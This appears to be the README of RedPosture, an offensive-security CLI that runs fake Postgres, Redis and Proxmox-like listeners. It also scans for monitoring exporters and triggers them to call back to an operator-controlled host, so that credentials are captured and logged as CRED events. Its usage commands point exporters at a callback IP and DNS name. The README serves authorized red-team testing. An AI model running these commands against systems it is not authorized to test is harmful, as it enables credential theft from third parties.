# RedPosture

RedPosture is a small Python CLI for:

- running honeypot listeners (`listen`) for postgres, redis, proxmox-like API, and blackbox-like endpoints
- discovering exporters (`scan`)
- triggering detected exporters to call back to your target (`trigger`)
- collecting debug endpoints from exporters (`collect`)

## Installation

### pipx (recommended)

```bash
pipx install "git+https://github.com/MelForze/Redposture.git"
```

### Local install

```bash
python -m pip install -e .
```

## Quick Start

### 1) Start honeypot listeners

```bash
redposture listen
```

TLS is off by default. Enable explicitly if needed:

```bash
redposture listen --postgres-tls --proxmox-tls
```

### 2) Scan hosts for exporters

```bash
redposture scan -t ./ips.txt -f txt
```

### 3) Trigger exporters

Trigger with callback IP:

```bash
redposture trigger -t "10.10.1.10,10.10.1.11" --callback-ip 10.20.122.106
```

`--callback-ip` accepts only IP literals (IPv4/IPv6).  
Use DNS names via `--callback-dns`.

Trigger with callback IP + DNS (both are used):

```bash
redposture trigger \
  -t "10.10.1.10,10.10.1.11" \
  --callback-ip 10.20.122.106 \
  --callback-dns honeypot.example.com
```

Tune parallelism and retries:

```bash
redposture trigger \
  -t ./ips.txt \
  --callback-ip 10.20.122.106 \
  --callback-dns honeypot.example.com \
  --workers 32 \
  --retries 2
```

Save full trigger/listener events to a txt file (without field truncation):

```bash
redposture trigger \
  -t ./ips.txt \
  --callback-ip 10.20.122.106 \
  -o ./trigger_events.txt
```
When `-o/--output` is set, successful trigger events are written to this file.

Start listeners first, then trigger, then keep listeners running:

```bash
redposture trigger \
  -t "10.10.1.10,10.10.1.11" \
  --callback-ip 10.20.122.106 \
  --callback-dns honeypot.example.com \
  --with-listen
```

### 4) Collect debug endpoints

```bash
redposture collect -t ./ips.txt -f txt
```

Use custom exporter profiles from JSON:

```bash
redposture scan -t ./ips.txt --profiles-file ./profiles.json
```

`-t/--targets` supports mixed values in one string:
- IP/DNS: `10.10.1.10,honeypot.example.com`
- CIDR: `10.10.1.0/24`
- file path: `./ips.txt` (each line can contain IP/DNS/CIDR; comments with `#` are supported)

## Output

- Runtime events are printed as readable colorized text.
- Credential events are highlighted with `CRED` and include `user=` / `pass=`.
- `scan` and `collect` support both `txt` and `json` output via `-f/--format`.
- `scan`, `trigger`, and `collect` support `--workers` and `--retries`.
- default `--timeout` is `1.0` second.
- `trigger` prints a summary with detected exporters, attempts, successes, failures, and per-callback stats.

Example runtime lines:

```txt
[20:41:20] [CRED] [REDIS] 10.0.0.2:6379 command=AUTH user=default pass=secret
[20:41:20] [INFO] [BLACKBOX] 10.0.0.1:9115 method=GET path=/probe module=http_2xx
```

## Commands

```bash
redposture --help
redposture --version
redposture listen --help
redposture scan --help
redposture trigger --help
redposture collect --help
```

## Profiles File

`--profiles-file` accepts a JSON object with optional keys:

- `trigger_exporters`
- `discovery_exporters`
- `collect_exporters`
- `collect_debug_endpoints`

Minimal example:

```json
{
  "trigger_exporters": [
    {
      "name": "custom_trigger",
      "port": 9199,
      "detect_path": "/metrics",
      "markers": ["custom_up"],
      "trigger_path": "/probe",
      "target_fmt": "{our_host}:9999"
    }
  ]
}
```

## Safety

Run this tool only in environments where you have explicit authorization.

## License

MIT (`LICENSE`).
